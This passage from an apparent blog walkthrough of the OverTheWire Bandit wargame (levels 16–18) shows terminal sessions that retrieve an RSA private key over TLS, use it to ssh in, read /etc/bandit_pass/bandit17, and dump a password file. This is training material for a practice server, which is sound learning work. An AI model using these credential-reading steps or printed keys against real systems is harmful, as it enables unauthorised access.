ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    Session-ID: EE1156EF7A043D8173A15CB87FC41D8BB3F61517B8414D62065541FD97928592</span><br><span class="line">    Session-ID-ctx: </span><br><span class="line">    Master-Key: 2E3037DCB9B4278B13DF68BE8111918D2D978F1B5F190052A0435E6BDD2ACE5751723FB13856C5E98F01240F88914768</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - 9f 82 12 97 ac 31 10 5b-65 4b 5d fb 71 e9 e8 02   .....1.[eK].q...</span><br><span class="line">    0010 - cc 56 9a 1f 91 2b c2 22-7e 93 d9 42 <span class="built_in">cd</span> 60 56 ab   .V...+.<span class="string">"~..B.`V.</span></span><br><span class="line"><span class="string">    0020 - 89 76 d6 95 7a b7 7e c7-6f d3 a2 95 a5 ee f2 b4   .v..z.~.o.......</span></span><br><span class="line"><span class="string">    0030 - 4d 48 68 f1 bf 23 df 87-de dd 64 a5 24 1e 1c e7   MHh..#....d.$...</span></span><br><span class="line"><span class="string">    0040 - 0b c3 f4 b2 c4 72 b9 61-26 3c 17 dd 78 61 68 dd   .....r.a&amp;&lt;..xah.</span></span><br><span class="line"><span class="string">    0050 - b8 59 36 15 76 19 6f 19-19 14 73 df 2d 8b 66 71   .Y6.v.o...s.-.fq</span></span><br><span class="line"><span class="string">    0060 - f2 83 0b 22 52 07 69 ba-83 15 0a cc 94 fe f9 07   ..."</span>R.i.........</span><br><span class="line">    0070 - 01 72 d2 18 de 60 42 c1-f5 8d 19 88 4b c9 74 bf   .r...`B.....K.t.</span><br><span class="line">    0080 - ad f5 bf 2b 53 3b 42 ab-89 eb 0c 52 82 de 55 b3   ...+S;B....R..U.</span><br><span class="line">    0090 - e0 8d 53 85 17 d3 3a 8a-1e 80 71 09 54 5d 3c f8   ..S...:...q.T]&lt;.</span><br><span class="line"></span><br><span class="line">    Start Time: 1581676499</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify <span class="built_in">return</span> code: 18 (self signed certificate)</span><br><span class="line">    Extended master secret: yes</span><br><span class="line">---</span><br><span class="line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br><span class="line">Correct!</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</span><br><span class="line">imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</span><br><span class="line">Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</span><br><span class="line">DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</span><br><span class="line">JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</span><br><span class="line">x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</span><br><span class="line">KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</span><br><span class="line">J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</span><br><span class="line">d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</span><br><span class="line">YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</span><br><span class="line">vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</span><br><span class="line">+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</span><br><span class="line">8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</span><br><span class="line">SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</span><br><span class="line">HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</span><br><span class="line">SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</span><br><span class="line">R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</span><br><span class="line">Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</span><br><span class="line">R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</span><br><span class="line">L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</span><br><span class="line">blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</span><br><span class="line">YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</span><br><span class="line">77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</span><br><span class="line">dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</span><br><span class="line">vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">closed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31518 -ign_eof</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify error:num=18:self signed certificate</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/CN=localhost</span><br><span class="line">   i:/CN=localhost</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICBjCCAW+gAwIBAgIES250rzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="line">b2NhbGhvc3QwHhcNMjAwMjA5MjA0NzIwWhcNMjEwMjA4MjA0NzIwWjAUMRIwEAYD</span><br><span class="line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBANWyxh7K</span><br><span class="line">T86zWM4NFe95x2KNEBUDz2XlGvU7KxUM9z1OfakmLDYCiujYdR6gI4ZBtyhEql5P</span><br><span class="line">taCiNWO+ZDJCKWhjH/TyIywxjW9/PBHRC8UEzhsxc0wMHbLrlYFwzxT2KjhI3EVY</span><br><span class="line">5VIWkzKrgHuON6PuBbmN0g0z5NN/xYch4kPpAgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4GBAFX4+KlTXWb4R/pUVt7i4FWvp3CuqgLUtgU3vRZqJ3wShIyDbsFK</span><br><span class="line">a4S9uSuWcLLvyq0aa4kLhmoepyNlI3BGUSZZbRXwo/1e5IpCX3RdHhlIc3/Sd7ln</span><br><span class="line">usTkejgEftWMmmBc03RY07EMxbNeXE8zzh2NP+5kVfwWG6GoGuQMXhy8</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">subject=/CN=localhost</span><br><span class="line">issuer=/CN=localhost</span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA512</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has <span class="built_in">read</span> 1019 bytes and written 269 bytes</span><br><span class="line">Verification error: self signed certificate</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">Server public key is 1024 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    Session-ID: 8F0B20A8164B9ED461FBD0721FA2A8AA489C77A00124ACE93381D0512F7A2740</span><br><span class="line">    Session-ID-ctx: </span><br><span class="line">    Master-Key: F880B59CBA1854941DFA1C725F833F75B1177248D9651876542343A15AF9E24A45078F96FD305D27CFBE70486DF2EAA3</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - 26 1a 05 91 72 ce a3 a6-e5 fa 17 b1 24 c4 2b 6f   &amp;...r.......$.+o</span><br><span class="line">    0010 - 1d a9 b9 da 93 9a 35 e5-f1 7e <span class="built_in">fc</span> 83 02 92 06 6a   ......5..~.....j</span><br><span class="line">    0020 - d3 db 90 bb ec c3 bb c3-fe 8f a3 af 08 39 47 35   .............9G5</span><br><span class="line">    0030 - 61 90 8c 2b 82 e3 28 b3-16 e9 f9 6a 4c c1 59 2d   a..+..(....jL.Y-</span><br><span class="line">    0040 - c3 50 40 7a ca b9 c0 54-c8 d9 0b 9b f0 2c 7b fa   .P@z...T.....,&#123;.</span><br><span class="line">    0050 - c7 a4 9a bf c7 f6 e6 0e-bf 07 dc 50 a3 bf 23 48   ...........P..<span class="comment">#H</span></span><br><span class="line">    0060 - e9 0f f3 fb b9 b4 39 1d-c0 0d 71 e2 80 05 fe e7   ......9...q.....</span><br><span class="line">    0070 - ed 38 48 55 d7 f0 b7 97-f1 a1 c2 06 1b 47 7d 51   .8HU.........G&#125;Q</span><br><span class="line">    0080 - 1e cc 4d e8 0e 76 73 0a-20 24 37 6f 20 c7 ca e7   ..M..vs. <span class="variable">$7o</span> ...</span><br><span class="line">    0090 - 5b bc 44 09 ad d6 8d 5c-e3 96 86 fd 7d d8 41 75   [.D....\....&#125;.Au</span><br><span class="line"></span><br><span class="line">    Start Time: 1581676568</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify <span class="built_in">return</span> code: 18 (self signed certificate)</span><br><span class="line">    Extended master secret: yes</span><br><span class="line">---</span><br><span class="line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br><span class="line">cluFn7wTiGryunymYOu4RcffSxQluehd</span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line">bandit16@bandit:~$</span><br></pre></td></tr></table></figure><p>nmap扫端口是真的快</p><h3 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">bl@bl-virtual-machine:~/wargame$ <span class="built_in">echo</span> <span class="string">'-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</span></span><br><span class="line"><span class="string">imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</span></span><br><span class="line"><span class="string">Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</span></span><br><span class="line"><span class="string">DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</span></span><br><span class="line"><span class="string">JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</span></span><br><span class="line"><span class="string">x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</span></span><br><span class="line"><span class="string">KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</span></span><br><span class="line"><span class="string">J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</span></span><br><span class="line"><span class="string">d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</span></span><br><span class="line"><span class="string">YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</span></span><br><span class="line"><span class="string">vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</span></span><br><span class="line"><span class="string">+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</span></span><br><span class="line"><span class="string">8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</span></span><br><span class="line"><span class="string">SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</span></span><br><span class="line"><span class="string">HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</span></span><br><span class="line"><span class="string">SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</span></span><br><span class="line"><span class="string">R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</span></span><br><span class="line"><span class="string">Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</span></span><br><span class="line"><span class="string">R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</span></span><br><span class="line"><span class="string">L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</span></span><br><span class="line"><span class="string">blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</span></span><br><span class="line"><span class="string">YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</span></span><br><span class="line"><span class="string">77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</span></span><br><span class="line"><span class="string">dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</span></span><br><span class="line"><span class="string">vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----'</span> &gt; b16.rsa</span><br><span class="line"></span><br><span class="line">bl@bl-virtual-machine:~/wargame$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i b16.rsa </span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0644 <span class="keyword">for</span> <span class="string">'b16.rsa'</span> are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br><span class="line">Load key <span class="string">"b16.rsa"</span>: bad permissions</span><br><span class="line">bandit17@bandit.labs.overthewire.org<span class="string">'s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bl@bl-virtual-machine:~/wargame$ chmod 600 b16.rsa </span></span><br><span class="line"><span class="string">bl@bl-virtual-machine:~/wargame$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i b16.rsa </span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit17@bandit:~$ cat /etc/bandit_pass/bandit17</span></span><br><span class="line"><span class="string">xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn</span></span><br></pre></td></tr></table></figure><p>之前没注意，ssh私钥需要600权限，登进去之后就顺手看了下密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bandit17@bandit:~$ ls</span><br><span class="line">passwords.new  passwords.old</span><br><span class="line">bandit17@bandit:~$ strings passwords.old</span><br><span class="line">4d22drdsITVoHcfd8bAHeeKrdL3mMHpU</span><br><span class="line">QeGg8ya1PGU13yp57EWuUaxErl8VWjlM</span><br><span class="line">CUGTwQyhKs4fEQLH0UdD7ywCrYBDceZ7</span><br><span class="line">2hUdQXUPpBJKzkslSHCOiC3ytdJ1cuqI</span><br><span class="line">WxgyH7990nLi81smXOeDGnKTpZTlAU3f</span><br><span class="line">g4diRjbnq4PhyC1rfuCaFXZmBLgHPmo6</span><br><span class="line">MBf7rFYTik6DurpaVdC5mXngsTiXWwhv</span><br><span class="line">3zt8L6QnDKXLGWhRvQBUczrk6O5KLl7i</span><br><span class="line">bm9g6Ypy9zVLojtpPaKBKViAKnL19QEY</span><br><span class="line">N2rkdeuoi1RBXCiCDQWlk4BU76M3wJFv</span><br><span class="line">PR0AOkN4NodK61ewgBHS56sEDr3LAobb</span><br><span class="line">CaVTEQzrWPuDvBm9D4CGL8BSC4arizFq</span><br><span class="line">FgheNL06s1UCW8UiuFUWSmtGedi2TxIH</span><br><span class="line">Lvh1gpC39tdJMAJH0atjJLF4yRlCoSH4</span><br><span class="line">OpTHYem6UHMY2zLgwm2sI4e1faHw0M1b</span><br><span class="line">Z84471LxMWArPnxJGsMmvvl2qCcBXZ7M</span><br><span class="line">CExYI7LMdZLSj9AiFp8rutQY6uIcqdfx</span><br><span class="line">lC1IFZxlnj05ZuWKY5Ytad9bTZ0eMgYC</span><br><span class="line">4OfOZR4CMqlUFgxw8nZbKtW3eJcZPrqn</span><br><span class="line">bbctuDOWMvYUCWAiY7APEUnYPUo0zYiT</span><br><span class="line">sCepFVPJBglEuU8uY0LllG1oIJ2HOvrH</span><br><span class="line">o9sp7odH3blIlshg2aCrWPdzuDq5lxx5</span><br><span class="line">97Vd3224QGOfsPGwjURphDfn7ISeXd3S</span><br><span class="line">Tz97n5taD1ZskKSlC1WHDU1CZZ5I3PnM</span><br><span class="line">NDkYNzqHAZnjn7GoKk6kUjmBwLbZ5IjT</span><br><span class="line">pd1THzlzKbAnR9uPnI75EpXdZVUFyVD9</span><br><span class="line">GGwbSfJpRjzYvNHb1n2riVU3VnxCSe9I</span><br><span class="line">qLufXtxv2XKcjrWDqIojlINiJhU9LYCp</span><br><span class="line">kpxAYarBToFo4Vsr1jDBQREvRtbUA9i2</span><br><span class="line">s8ZEkk0YuNoA9YnyUvVwFy29cMIP4psJ</span><br><span class="line">m0q33SCpHDBfTL2yRb8Db2lb6qIX8hjf</span><br><span class="line">xhHqvStzyrj0k1eLNbiQHmadzlY80iZg</span><br><span class="line">FExGbU63PyeJsfxtoIaVjiFKXAhEon0C</span><br><span class="line">04y09Cd0CvZBSnrC1BjauTj70D3P84Gw</span><br><span class="line">Kr58zsSpmfKy4ILtUqbo2hqooPHnI13L</span><br><span class="line">ruisEF4OA3MyOdLEFwVdW84ZwJXRioRT</span><br><span class="line">kN2hWkHUehtqqWpnZW1CulYiOv8RJwPl</span><br><span class="line">V045YMJnMGdta9yQD8ALdny0hholXmdw</span><br><span class="line">gZ5U640FLMMChheWKHNdaQ1lKzLuqjxZ</span><br><span class="line">Al0xVJb5bEzhnFG8nPFe6IJa2FjXVSzo</span><br><span class="line">CT2ZJy6MoLkTqdHuhL5zUIsW41WCntAA</span><br><span class="line">hlbSBPAWJmL6WFDb06gpTx1pPButblOA</span><br><span class="line">46lUvvv0JJzyY0IOhWgGp5IjfsllmvaC</span><br><span class="line">FcSd4Me936rwbk2pAU9ylx9NXTrzdCaX</span><br><span class="line">vfU4mCzATtqUMNLg3a7mPs3OY6Dr4jaZ</span><br><span class="line">mOWgkKPfjXibrdfgG57CWMcbeqBRg4IU</span><br><span class="line">VudOaCtkUbhOdF7dE7KACOqH0R9weDhQ</span><br><span class="line">vzwsuF0cp5IrmEmGb7qNr4VUlsLi463t</span><br><span class="line">ymAqpKh2CPdC7iqFk4KcKdlXeKZqSrhW</span><br><span class="line">ta02hN70k7BoxfiVn7viAFoWKaGDOKnC</span><br><span class="line">bPLvqxn5BDtg4wy8c2uO0x7y3yi3RPMU</span><br><span class="line">VUcDEAfnRTt8nTlAd55q94L6rr0jfCCU</span><br><span class="line">QAIDBC5fx4bBOsyOd8NYItiPWGMaGXY9</span><br><span class="line">X1NUQJrIsrNfaGHMUolOcepDiNss842e</span><br><span class="line">DAL411ARIMja2B3VibQxzNn8iqxCvtPB</span><br><span class="line">Gq0BvsinoaBAuqwLJwtWCSe1wMdiSBSZ</span><br><span class="line">RVO0eC5aK1WRlpKqPAglNSOPwc1OvUp8</span><br><span class="line">XCBD77G8bknfL90F44o0Nbe1jqCBvxqh</span><br><span class="line">qOZOpK7UHdGgsZeQirx8wr9omjopkzuP</span><br><span class="line">nQ1IO5OUcJ4P8ZSrLYNQLFnWS32AMUcE</span><br><span class="line">oUpDAclcfOrSI10qeUCHqxvSxR0aXyrN</span><br><span class="line">uzPVdEpMDIvTBj3eB4mgmhEeCg1WEFqL</span><br><span class="line">WThihtgEnlmNQ6SAqROgERjyxNfgJZk5</span><br><span class="line">l9sPHyleBjYNlZxQbHiCKNoeEfL7W3RA</span><br><span class="line">qfcmi6vHWL5CS7nqkHTcSdeRIoxDEGjU</span><br><span class="line">cI4zMnmzAP4Ei6FvZQ4vgvUhrhKYajGH</span><br><span class="line">MlKrQsbeU3cvq0GNIvwSMipBFUCHRLb4</span><br><span class="line">yqPoTs4J1oNw6KqREjqQk1fXNxAtQzNN</span><br><span class="line">6HgQNDvsu4VC7KBhIpQRCIRhLo4izRjG</span><br><span class="line">nPhoiXgdg3T385gjubCcKtnEa2kSQYiF</span><br><span class="line">BBWqlFI2IycHpCSESbmi8bgQ3XaRVkH9</span><br><span class="line">zC5qgaooKVu5QNTtqEXcgPpmX2IXZcd5</span><br><span class="line">BP8DJZaleBMYuyMzG96xJ6RDk6QUvLoi</span><br><span class="line">NsYnz4oTlDRKsDyWWVvseAeLnrVz80ul</span><br><span class="line">2MVRp5Pej7Ngv3QlcfY9MhFrpm1EER3U</span><br><span class="line">niQz99Dp18DDLdpkqxatJEorlEuxbffD</span><br><span class="line">0LZ5juRJ7Kpn9Y1d2tnXjZY5Qe5YsoSn</span><br><span class="line">DFkA6xfENw4qcgbyJOR1Lq4wHzoEzXf1</span><br><span class="line">DuyGtXuifUSHgURCvn8wW8ZVGkMFEwCG</span><br><span 